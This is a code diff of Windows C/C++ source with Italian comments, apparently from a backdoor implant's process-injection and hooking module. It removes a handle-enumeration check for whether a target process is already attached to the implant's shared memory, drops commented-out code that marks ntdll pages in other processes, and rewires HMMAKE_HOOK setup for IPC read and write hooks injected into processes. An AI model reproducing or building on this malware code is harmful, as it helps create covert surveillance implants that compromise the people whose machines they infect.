@@ -187,23 +187,6 @@ NANOSEC_TIME date_delta; // Usato per eventuali aggiustamenti sulla lettura dell
 extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
 BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len);
 
-typedef DWORD PROCESSINFOCLASS;
-typedef struct _SYSTEM_HANDLE_INFORMATION {
-	ULONG  ProcessId;
-	UCHAR  ObjectTypeNumber;
-	UCHAR  Flags;
-	USHORT Handle;
-	PVOID  Object;
-	ACCESS_MASK  GrantedAccess;
-} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
-#define SystemHandleInformation 16
-typedef DWORD (WINAPI *ZWQUERYSYSTEMINFORMATION)(
-   PROCESSINFOCLASS ProcessInformationClass,
-   PVOID ProcessInformation,
-   ULONG ProcessInformationLength,
-   PULONG ReturnLength
-);
-
 ////////////////////////////////////////////////////////////////////////////////
 // 
 // Strutture, Dati e funzione iniettata nel Processo 
@@ -569,121 +552,11 @@ BOOL HM_ProcessByPass(DWORD pid)
 	return FALSE;
 }
 
-#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
-#define STATUS_SUCCESS 0
-BOOL CheckIPCAlreadyExist(DWORD pid, void *kobj)
-{
-	static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
-	LONG Status;
-	static DWORD *p = NULL;
-	int i;
-	DWORD n = 0x4000;
-	HMODULE hNtdll;
-	PSYSTEM_HANDLE_INFORMATION hinfo;
-	BOOL now_created = FALSE;
+BOOL CheckIPCAlreadyExist(DWORD pid);	// forwarded to HM_IpcModule
 
-	if (kobj == NULL)
-		return TRUE;
-
-	for (i=0; i<2; i++) {
-		if (p == NULL) {
-			if (ZwQuerySystemInformation == NULL) {
-				hNtdll = GetModuleHandle("ntdll.dll");
-				ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
-				if (!ZwQuerySystemInformation)
-					return TRUE;
-			}
-
-			if ( !(p = (DWORD *)malloc(n)) )
-				return TRUE;
-
-			while ( (Status=ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH ) {
-				SAFE_FREE(p);
-				n*=4;
-				if (!(p = (DWORD *)malloc(n)))
-					return TRUE;
-			}
-			if (Status != STATUS_SUCCESS) {
-				SAFE_FREE(p);
-				return TRUE;
-			}
-			now_created = TRUE;
-		}
-
-		hinfo = PSYSTEM_HANDLE_INFORMATION(p + 1);
-		for (DWORD i = 0; i < *p; i++) {
-			if (hinfo[i].ProcessId == pid  && hinfo[i].Object == kobj) {
-				return TRUE;
-			}
-		}
-		
-		if(now_created)
-			return FALSE;
-		
-		SAFE_FREE(p);
-	}
-	return FALSE;
-}
-
-#define PAGE_MARKER PAGE_EXECUTE_WRITECOPY
 BOOL MarkProcess(DWORD pid)
 {
-	// E' sufficiente il secondo check che e' anche compatibile
-	// con l'installazione multipla di backdoor - XXX MINST
-/*	BYTE *header_ptr = NULL;
-	HANDLE hmodules, hprocess;
-	MODULEENTRY32W me32;
-	MEMORY_BASIC_INFORMATION mbi;
-	DWORD dummy;
-	
-	me32.dwSize = sizeof(MODULEENTRY32W); 
-	hmodules = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPMODULE, pid);
-	if (hmodules == INVALID_HANDLE_VALUE)
-		return FALSE;
-
-	if(!FNC(Module32FirstW)(hmodules, &me32)) {
-		CloseHandle(hmodules);
-		return FALSE;
-	}
-
-	do {
-		if (!wcsicmp(me32.szModule, L"ntdll.dll")) {
-			header_ptr = me32.modBaseAddr;
-			break;
-		}
-	} while(FNC(Module32NextW)(hmodules, &me32));
-	CloseHandle(hmodules);
-	if (header_ptr == NULL)
-		return FALSE;
-	
-	hprocess = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pid);
-	if (hprocess == NULL)
-		return FALSE;
-
-	if (!FNC(VirtualQueryEx)(hprocess, header_ptr, &mbi, sizeof(mbi))) {
-		CloseHandle(hprocess);
-		return FALSE;
-	}
-	CloseHandle(hprocess);
-
-	// Ha trovato il marker di pagina
-	if (mbi.Protect & PAGE_MARKER) 
-		return FALSE;
-
-	hprocess = FNC(OpenProcess)(PROCESS_VM_OPERATION, FALSE, pid);
-	if (hprocess == NULL)
-		return FALSE;
-
-	if (!HM_SafeVirtualProtectEx(hprocess, header_ptr, 32, PAGE_MARKER, &dummy)) {
-		CloseHandle(hprocess);
-		return FALSE;
-	}
-
-	CloseHandle(hprocess);*/
-
-	// Check paranoico se il processo e' gia' attaccato alla shared memory
-	// (caso comodo...)
-	if (CheckIPCAlreadyExist(pid, IPC_SHM_Kernel_Object))
+	if (CheckIPCAlreadyExist(pid))
 		return FALSE;
 
 	return TRUE;
@@ -1046,10 +919,10 @@ void WINAPI HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOOL l
 
 void WINAPI HM_sInBundleService(DWORD dwPid, HMServiceStruct *pServiceData)
 {
-	HMMAKE_HOOK(dwPid, NULL, IPCClientRead, IPCClientRead_data, IPCClientRead_setup, NULL, NULL);
-	HMMAKE_HOOK(dwPid, NULL, IPCClientWrite, IPCClientWrite_data, IPCClientWrite_setup, NULL, NULL);
-	pServiceData->pHM_IpcCliRead = (HM_IPCClientRead_t) IPCClientRead_data.dwHookAdd;	
-	pServiceData->pHM_IpcCliWrite = (HM_IPCClientWrite_t) IPCClientWrite_data.dwHookAdd;
+	HMMAKE_HOOK(dwPid, NULL, IPCClientRead, ipc_read, IPCClientRead_setup, NULL, NULL);
+	HMMAKE_HOOK(dwPid, NULL, IPCClientWrite, ipc_write, IPCClientWrite_setup, NULL, NULL);
+	pServiceData->pHM_IpcCliRead = (HM_IPCClientRead_t) ipc_read.dwHookAdd;	
+	pServiceData->pHM_IpcCliWrite = (HM_IPCClientWrite_t) ipc_write.dwHookAdd;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
